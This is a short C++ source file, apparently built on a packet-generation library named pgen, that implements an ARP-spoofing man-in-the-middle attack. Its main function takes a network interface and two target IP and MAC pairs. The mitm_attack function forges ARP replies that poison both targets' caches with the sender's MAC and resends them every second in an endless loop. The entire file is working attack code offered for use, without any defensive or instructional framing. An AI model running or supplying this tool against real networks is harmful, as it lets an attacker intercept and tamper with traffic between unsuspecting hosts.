#include "pgen.h"
#include <stdio.h>
#include <pcap.h>
#include <thread>


void mitm_attack(const char* dev, const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);


int main(int argc,char** argv){
	if(argc != 6){
		printf("Usage: %s interface target1IP target1MAC target2IP target2MAC\n",
				argv[0]);
		return -1;
	}

	mitm_attack(argv[1], argv[2], argv[3], argv[4], argv[5]);
}


void mitm_attack(const char* dev, const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src.setmacbydev(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = 2;

	pack_to_target2.ETH.src.setmacbydev(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = 2;

	for(int i=0; ; i++){
		pack_to_target1.send(dev);
		pack_to_target2.send(dev);
		sleep(1);
	}		
}


